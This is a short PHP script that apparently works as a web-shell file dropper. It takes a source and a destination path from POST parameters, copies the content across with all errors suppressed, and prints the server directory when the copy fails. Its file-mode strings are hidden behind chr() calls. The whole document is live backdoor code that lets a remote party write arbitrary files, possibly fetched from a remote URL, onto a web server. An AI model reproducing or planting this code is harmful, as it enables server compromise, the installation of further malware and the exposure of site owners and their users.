<?php
$u=$_POST["u"];
$p=$_POST["p"];
$F=@fopen($u,chr(114));
$L=@fopen($p,chr(119));
if($F && $L){
	while(!feof($F))@fwrite($L,@fgetc($F));
	@fclose($F);
	@fclose($L);
	echo("OK");
}else{
	echo(dirname(__FILE__));
}
?>